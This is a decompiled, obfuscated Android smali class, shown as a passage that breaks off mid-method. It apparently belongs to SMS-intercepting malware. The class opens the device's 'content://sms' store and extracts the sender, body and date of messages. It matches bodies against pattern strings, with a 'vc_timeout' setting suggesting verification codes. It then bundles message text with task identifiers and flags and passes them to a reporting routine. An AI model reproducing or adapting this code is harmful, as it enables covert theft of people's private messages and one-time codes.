.class public Lcom/boJUF/mB/mB/pO/JO/tP/ac;
.super Lcom/boJUF/mB/mB/pO/tP/uI;


# static fields
.field private static Ab:I

.field private static Hm:I

.field private static Jl:I

.field private static volatile Lx:Lcom/boJUF/mB/mB/pO/JO/tP/ac;


# instance fields
.field IL:Ljava/lang/Runnable;

.field private VY:Landroid/net/Uri;

.field private YM:Ljava/lang/Runnable;

.field private bh:Lcom/boJUF/mB/mB/pO/JO/tP/uI;

.field private gj:Landroid/database/Cursor;

.field private rC:Landroid/content/Context;

.field private sj:Lcom/boJUF/mB/mB/pO/JO/mB/uI;

.field private uv:J


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/4 v0, 0x0

    sput-object v0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->Lx:Lcom/boJUF/mB/mB/pO/JO/tP/ac;

    const/16 v0, 0x1f4

    sput v0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->Ab:I

    const v0, 0x1d4c0

    sput v0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->Hm:I

    const v0, 0xf731400

    sput v0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->Jl:I

    return-void
.end method

.method private constructor <init>(Landroid/content/Context;)V
    .locals 3

    const/4 v1, 0x0

    invoke-direct {p0}, Lcom/boJUF/mB/mB/pO/tP/uI;-><init>()V

    const-string v0, "content://sms"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    iput-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->VY:Landroid/net/Uri;

    iput-object v1, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->sj:Lcom/boJUF/mB/mB/pO/JO/mB/uI;

    iput-object v1, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->bh:Lcom/boJUF/mB/mB/pO/JO/tP/uI;

    iput-object v1, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->rC:Landroid/content/Context;

    iput-object v1, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->gj:Landroid/database/Cursor;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    iput-wide v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->uv:J

    new-instance v0, Lcom/boJUF/mB/mB/pO/JO/tP/XQ;

    invoke-direct {v0, p0}, Lcom/boJUF/mB/mB/pO/JO/tP/XQ;-><init>(Lcom/boJUF/mB/mB/pO/JO/tP/ac;)V

    iput-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->YM:Ljava/lang/Runnable;

    new-instance v0, Lcom/boJUF/mB/mB/pO/JO/tP/tQ;

    invoke-direct {v0, p0}, Lcom/boJUF/mB/mB/pO/JO/tP/tQ;-><init>(Lcom/boJUF/mB/mB/pO/JO/tP/ac;)V

    iput-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->IL:Ljava/lang/Runnable;

    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iput-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->rC:Landroid/content/Context;

    new-instance v0, Lcom/boJUF/mB/mB/pO/JO/tP/uI;

    iget-object v1, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->rC:Landroid/content/Context;

    invoke-direct {v0, v1}, Lcom/boJUF/mB/mB/pO/JO/tP/uI;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->bh:Lcom/boJUF/mB/mB/pO/JO/tP/uI;

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->rC:Landroid/content/Context;

    invoke-static {v0}, Lcom/boJUF/mB/mB/pO/JO/mB/uI;->LA(Landroid/content/Context;)Lcom/boJUF/mB/mB/pO/JO/mB/uI;

    move-result-object v0

    iput-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->sj:Lcom/boJUF/mB/mB/pO/JO/mB/uI;

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->rC:Landroid/content/Context;

    const-string v1, "vc_timeout"

    const/16 v2, 0x1f4

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/boJUF/mB/mB/VD/mB/Ke;->cp(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Integer;

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    sput v0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->Ab:I

    return-void
.end method

.method static synthetic IL()Landroid/os/Handler;
    .locals 1

    sget-object v0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->TP:Landroid/os/Handler;

    return-object v0
.end method

.method static synthetic LA(Lcom/boJUF/mB/mB/pO/JO/tP/ac;J)J
    .locals 0

    iput-wide p1, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->uv:J

    return-wide p1
.end method

.method static synthetic LA(Lcom/boJUF/mB/mB/pO/JO/tP/ac;Landroid/database/Cursor;)Landroid/database/Cursor;
    .locals 0

    iput-object p1, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->gj:Landroid/database/Cursor;

    return-object p1
.end method

.method static synthetic LA(Lcom/boJUF/mB/mB/pO/JO/tP/ac;)Lcom/boJUF/mB/mB/pO/JO/mB/uI;
    .locals 1

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->sj:Lcom/boJUF/mB/mB/pO/JO/mB/uI;

    return-object v0
.end method

.method public static LA(Landroid/content/Context;)Lcom/boJUF/mB/mB/pO/JO/tP/ac;
    .locals 2

    sget-object v0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->Lx:Lcom/boJUF/mB/mB/pO/JO/tP/ac;

    if-nez v0, :cond_1

    const-class v1, Lcom/boJUF/mB/mB/pO/JO/tP/ac;

    monitor-enter v1

    :try_start_0
    sget-object v0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->Lx:Lcom/boJUF/mB/mB/pO/JO/tP/ac;

    if-nez v0, :cond_0

    new-instance v0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;

    invoke-direct {v0, p0}, Lcom/boJUF/mB/mB/pO/JO/tP/ac;-><init>(Landroid/content/Context;)V

    sput-object v0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->Lx:Lcom/boJUF/mB/mB/pO/JO/tP/ac;

    :cond_0
    monitor-exit v1
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    :cond_1
    sget-object v0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->Lx:Lcom/boJUF/mB/mB/pO/JO/tP/ac;

    return-object v0

    :catchall_0
    move-exception v0

    monitor-exit v1

    throw v0
.end method

.method public static LA(Landroid/database/Cursor;)Ljava/util/List;
    .locals 4

    const/4 v0, 0x0

    if-nez p0, :cond_1

    :cond_0
    :goto_0
    return-object v0

    :cond_1
    invoke-interface {p0}, Landroid/database/Cursor;->getCount()I

    move-result v1

    if-gtz v1, :cond_2

    invoke-interface {p0}, Landroid/database/Cursor;->close()V

    goto :goto_0

    :cond_2
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    :goto_1
    :try_start_0
    invoke-interface {p0}, Landroid/database/Cursor;->moveToNext()Z

    move-result v1

    if-eqz v1, :cond_0

    new-instance v1, Lcom/boJUF/mB/mB/pO/mB/XQ;

    invoke-direct {v1}, Lcom/boJUF/mB/mB/pO/mB/XQ;-><init>()V

    const-string v2, "address"

    invoke-interface {p0, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {p0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    iput-object v2, v1, Lcom/boJUF/mB/mB/pO/mB/XQ;->LA:Ljava/lang/String;

    const-string v2, "body"

    invoke-interface {p0, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {p0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    iput-object v2, v1, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    const-string v2, "date"

    invoke-interface {p0, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {p0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v2

    iput-wide v2, v1, Lcom/boJUF/mB/mB/pO/mB/XQ;->On:J

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v1

    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method private LA(Lcom/boJUF/mB/mB/pO/mB/Lr;Lcom/boJUF/mB/mB/pO/mB/XQ;)V
    .locals 5

    if-nez p2, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    :try_start_0
    invoke-static {}, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->On()V

    iget-wide v0, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->On:J

    sget-wide v2, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->On:J

    cmp-long v0, v0, v2

    if-gez v0, :cond_2

    sget-object v0, Lcom/boJUF/mB/mB/tP/uI;->x:Ljava/lang/String;

    goto :goto_0

    :cond_2
    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->sj:Lcom/boJUF/mB/mB/pO/JO/mB/uI;

    iget-object v1, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->LA:Ljava/lang/String;

    iget-object v2, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    iget-wide v3, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->On:J

    invoke-virtual {v0, v1, v2, v3, v4}, Lcom/boJUF/mB/mB/pO/JO/mB/uI;->cp(Ljava/lang/String;Ljava/lang/String;J)Z

    move-result v0

    if-eqz v0, :cond_3

    sget-object v0, Lcom/boJUF/mB/mB/tP/uI;->y:Ljava/lang/String;

    goto :goto_0

    :cond_3
    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/Lr;->VY()I

    move-result v0

    if-ltz v0, :cond_4

    sget-object v0, Lcom/boJUF/mB/mB/tP/uI;->z:Ljava/lang/String;

    goto :goto_0

    :cond_4
    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->sj:Lcom/boJUF/mB/mB/pO/JO/mB/uI;

    const/4 v1, 0x0

    invoke-virtual {v0, p1, v1}, Lcom/boJUF/mB/mB/pO/JO/mB/uI;->LA(Lcom/boJUF/mB/mB/pO/mB/Lr;I)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->sj:Lcom/boJUF/mB/mB/pO/JO/mB/uI;

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/Lr;->LA()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/Lr;->cp()I

    move-result v2

    const/4 v3, 0x3

    const/4 v4, 0x1

    invoke-virtual {v0, v1, v2, v3, v4}, Lcom/boJUF/mB/mB/pO/JO/mB/uI;->LA(Ljava/lang/String;III)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->bh:Lcom/boJUF/mB/mB/pO/JO/tP/uI;

    invoke-static {p2}, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->TP(Lcom/boJUF/mB/mB/pO/mB/XQ;)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/util/HashMap;

    invoke-direct {v1}, Ljava/util/HashMap;-><init>()V

    const-string v2, "SOID"

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/Lr;->LA()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v2, "TID"

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/Lr;->cp()I

    move-result v3

    invoke-static {v3}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v2, "text"

    invoke-virtual {v1, v2, v0}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const/16 v2, 0xce5

    iget-object v3, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->rC:Landroid/content/Context;

    invoke-static {v2, v1, v3}, Lcom/boJUF/mB/mB/pO/tP/tQ;->LA(ILjava/util/HashMap;Landroid/content/Context;)Z

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/Lr;->On()I

    move-result v1

    if-nez v1, :cond_5

    iget-object v1, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->sj:Lcom/boJUF/mB/mB/pO/JO/mB/uI;

    invoke-virtual {v1, p1, v0}, Lcom/boJUF/mB/mB/pO/JO/mB/uI;->LA(Lcom/boJUF/mB/mB/pO/mB/Lr;Ljava/lang/String;)Z

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->sj:Lcom/boJUF/mB/mB/pO/JO/mB/uI;

    invoke-virtual {v0, p1}, Lcom/boJUF/mB/mB/pO/JO/mB/uI;->LA(Lcom/boJUF/mB/mB/pO/mB/Lr;)Z

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->rC:Landroid/content/Context;

    invoke-static {v0}, Lcom/boJUF/mB/mB/pO/Xd/tP/uI;->LA(Landroid/content/Context;)Lcom/boJUF/mB/mB/pO/Xd/tP/uI;

    move-result-object v0

    const/4 v1, -0x1

    invoke-virtual {v0, v1}, Lcom/boJUF/mB/mB/pO/Xd/tP/uI;->cp(I)V

    :goto_1
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    sput-wide v0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->On:J

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->sj:Lcom/boJUF/mB/mB/pO/JO/mB/uI;

    iget-object v1, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->LA:Ljava/lang/String;

    iget-object v2, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    iget-wide v3, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->On:J

    invoke-virtual {v0, v1, v2, v3, v4}, Lcom/boJUF/mB/mB/pO/JO/mB/uI;->LA(Ljava/lang/String;Ljava/lang/String;J)Z

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->bh:Lcom/boJUF/mB/mB/pO/JO/tP/uI;

    invoke-virtual {v0, p2}, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->cp(Lcom/boJUF/mB/mB/pO/mB/XQ;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_6

    sget-object v0, Lcom/boJUF/mB/mB/tP/uI;->B:Ljava/lang/String;

    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    const-string v1, "SOID"

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/Lr;->LA()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "TID"

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/Lr;->cp()I

    move-result v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "flag"

    const-string v2, "1"

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const/16 v1, 0xce7

    iget-object v2, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->rC:Landroid/content/Context;

    invoke-static {v1, v0, v2}, Lcom/boJUF/mB/mB/pO/tP/tQ;->LA(ILjava/util/HashMap;Landroid/content/Context;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto/16 :goto_0

    :cond_5
    :try_start_1
    iget-object v1, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->sj:Lcom/boJUF/mB/mB/pO/JO/mB/uI;

    invoke-virtual {v1, p1, v0}, Lcom/boJUF/mB/mB/pO/JO/mB/uI;->LA(Lcom/boJUF/mB/mB/pO/mB/Lr;Ljava/lang/String;)Z

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->sj:Lcom/boJUF/mB/mB/pO/JO/mB/uI;

    invoke-virtual {v0, p1}, Lcom/boJUF/mB/mB/pO/JO/mB/uI;->cp(Lcom/boJUF/mB/mB/pO/mB/Lr;)Z

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->rC:Landroid/content/Context;

    invoke-static {v0}, Lcom/boJUF/mB/mB/pO/Xd/tP/uI;->LA(Landroid/content/Context;)Lcom/boJUF/mB/mB/pO/Xd/tP/uI;

    move-result-object v0

    const/4 v1, 0x5

    invoke-virtual {v0, v1}, Lcom/boJUF/mB/mB/pO/Xd/tP/uI;->cp(I)V

    goto :goto_1

    :cond_6
    sget-object v0, Lcom/boJUF/mB/mB/tP/uI;->C:Ljava/lang/String;

    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    const-string v1, "SOID"

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/Lr;->LA()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "TID"

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/Lr;->cp()I

    move-result v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "flag"

    const-string v2, "0"

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const/16 v1, 0xce7

    iget-object v2, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->rC:Landroid/content/Context;

    invoke-static {v1, v0, v2}, Lcom/boJUF/mB/mB/pO/tP/tQ;->LA(ILjava/util/HashMap;Landroid/content/Context;)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_0
.end method

.method private LA(Lcom/boJUF/mB/mB/pO/mB/ji;Lcom/boJUF/mB/mB/pO/mB/XQ;)V
    .locals 5

    if-nez p2, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    :try_start_0
    invoke-static {}, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->On()V

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->sj:Lcom/boJUF/mB/mB/pO/JO/mB/uI;

    iget-object v1, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->LA:Ljava/lang/String;

    iget-object v2, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    iget-wide v3, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->On:J

    invoke-virtual {v0, v1, v2, v3, v4}, Lcom/boJUF/mB/mB/pO/JO/mB/uI;->cp(Ljava/lang/String;Ljava/lang/String;J)Z

    move-result v0

    if-nez v0, :cond_0

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/ji;->oC()I

    move-result v0

    if-gtz v0, :cond_0

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->sj:Lcom/boJUF/mB/mB/pO/JO/mB/uI;

    iget-object v1, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->LA:Ljava/lang/String;

    iget-object v2, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    iget-wide v3, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->On:J

    invoke-virtual {v0, v1, v2, v3, v4}, Lcom/boJUF/mB/mB/pO/JO/mB/uI;->LA(Ljava/lang/String;Ljava/lang/String;J)Z

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->sj:Lcom/boJUF/mB/mB/pO/JO/mB/uI;

    const/4 v1, 0x1

    invoke-virtual {v0, p1, v1}, Lcom/boJUF/mB/mB/pO/JO/mB/uI;->LA(Lcom/boJUF/mB/mB/pO/mB/ji;I)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->sj:Lcom/boJUF/mB/mB/pO/JO/mB/uI;

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/ji;->LA()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/ji;->cp()I

    move-result v2

    const/4 v3, 0x0

    const/4 v4, 0x1

    invoke-virtual {v0, v1, v2, v3, v4}, Lcom/boJUF/mB/mB/pO/JO/mB/uI;->LA(Ljava/lang/String;III)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->bh:Lcom/boJUF/mB/mB/pO/JO/tP/uI;

    invoke-static {p2}, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->TP(Lcom/boJUF/mB/mB/pO/mB/XQ;)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/util/HashMap;

    invoke-direct {v1}, Ljava/util/HashMap;-><init>()V

    const-string v2, "SOID"

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/ji;->LA()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v2, "TID"

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/ji;->cp()I

    move-result v3

    invoke-static {v3}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v2, "text"

    invoke-virtual {v1, v2, v0}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const/16 v0, 0xce8

    iget-object v2, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->rC:Landroid/content/Context;

    invoke-static {v0, v1, v2}, Lcom/boJUF/mB/mB/pO/tP/tQ;->LA(ILjava/util/HashMap;Landroid/content/Context;)Z

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->bh:Lcom/boJUF/mB/mB/pO/JO/tP/uI;

    invoke-virtual {v0, p2}, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->cp(Lcom/boJUF/mB/mB/pO/mB/XQ;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_2

    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    const-string v1, "SOID"

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/ji;->LA()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "TID"

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/ji;->cp()I

    move-result v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "flag"

    const-string v2, "1"

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const/16 v1, 0xce9

    iget-object v2, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->rC:Landroid/content/Context;

    invoke-static {v1, v0, v2}, Lcom/boJUF/mB/mB/pO/tP/tQ;->LA(ILjava/util/HashMap;Landroid/content/Context;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto/16 :goto_0

    :cond_2
    :try_start_1
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    const-string v1, "SOID"

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/ji;->LA()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "TID"

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/ji;->cp()I

    move-result v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "flag"

    const-string v2, "0"

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const/16 v1, 0xce9

    iget-object v2, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->rC:Landroid/content/Context;

    invoke-static {v1, v0, v2}, Lcom/boJUF/mB/mB/pO/tP/tQ;->LA(ILjava/util/HashMap;Landroid/content/Context;)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_0
.end method

.method private LA(Ljava/lang/String;Lcom/boJUF/mB/mB/pO/mB/XQ;Lcom/boJUF/mB/mB/pO/mB/Lr;I)V
    .locals 4

    const/4 v3, 0x1

    const/4 v2, 0x0

    const-string v0, "&"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_1

    const-string v0, "&"

    invoke-virtual {p1, v0}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    iget-object v1, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    aget-object v2, v0, v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_0

    iget-object v1, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    aget-object v0, v0, v3

    invoke-virtual {v1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->LA:Ljava/lang/String;

    invoke-virtual {p3}, Lcom/boJUF/mB/mB/pO/mB/Lr;->IL()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-direct {p0, p3, p2}, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->LA(Lcom/boJUF/mB/mB/pO/mB/Lr;Lcom/boJUF/mB/mB/pO/mB/XQ;)V

    :cond_0
    :goto_0
    return-void

    :cond_1
    const-string v0, ","

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_2

    const-string v0, ","

    invoke-virtual {p1, v0}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    iget-object v1, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    aget-object v2, v0, v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_0

    iget-object v1, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    aget-object v0, v0, v3

    invoke-virtual {v1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

